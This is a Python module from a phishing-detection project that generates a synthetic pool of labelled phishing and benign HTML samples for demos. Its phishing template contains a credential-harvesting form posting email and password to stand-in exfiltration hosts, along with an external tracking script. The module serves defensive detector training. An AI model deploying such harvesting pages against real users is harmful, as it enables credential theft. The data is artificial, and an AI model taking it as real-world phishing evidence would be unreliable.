"""Self-contained synthetic legacy-phishing/benign patterns.

Used anywhere this repo needs a "legacy" training/eval pool without
downloaded PhishTank/OpenPhish/Tranco snapshots — the Phase 6 demo
backend and the Phase 7 illustrative report run. This is NOT the Phase
3/4 experiment's real data; that requires the actual downloaded
snapshots (see `phishshield.data.loaders` and PROJECT_BRIEF.md, Phase 1).
Results produced from this module are for demos/illustration only, never
for the report's headline numbers.
"""

from __future__ import annotations

from phishshield.data.schema import Sample, Source

_SYNTHETIC_PHISHING_HTML = """<!DOCTYPE html>
<html>
<head>
  <title>{brand} - Verify Your Account</title>
  <script src="https://{exfil_host}/track.js"></script>
</head>
<body>
  <div style="display:none">hidden tracking pixel</div>
  <form action="https://{exfil_host}/collect" method="POST">
    <input type="email" name="email" />
    <input type="password" name="password" />
  </form>
</body>
</html>
"""

_SYNTHETIC_BENIGN_HTML = """<!DOCTYPE html>
<html>
<head><title>{name}</title></head>
<body><h1>{name}</h1><p>Nothing to see here.</p></body>
</html>
"""

_EXFIL_HOSTS = ["collect.exfil-drop.ru", "beacon.credential-sink.top", "relay.harvest-node.cn"]
_BRANDS = ["SecureBank", "MegaMail", "CloudPay", "SwiftShip", "PrimeStream", "VaultBank"]


def build_synthetic_legacy_pool(n_each: int = 30) -> list[Sample]:
    """Build a synthetic legacy-shaped training/eval pool: `n_each`
    phishing samples (password field, external form action, hidden
    element — the same signals the Phase 1 HTML feature extractor looks
    for) and `n_each` benign samples.
    """
    phishing = [
        Sample(
            url=f"https://{_BRANDS[i % len(_BRANDS)].lower()}-secure-{i}.verify-login.xyz/signin",
            label=1,
            source=Source.PHISHTANK,
            html=_SYNTHETIC_PHISHING_HTML.format(
                brand=_BRANDS[i % len(_BRANDS)],
                exfil_host=_EXFIL_HOSTS[i % len(_EXFIL_HOSTS)],
            ),
        )
        for i in range(n_each)
    ]
    benign = [
        Sample(
            url=f"https://site-{i}.example.com/",
            label=0,
            source=Source.TRANCO,
            html=_SYNTHETIC_BENIGN_HTML.format(name=f"Site {i}"),
        )
        for i in range(n_each)
    ]
    return phishing + benign
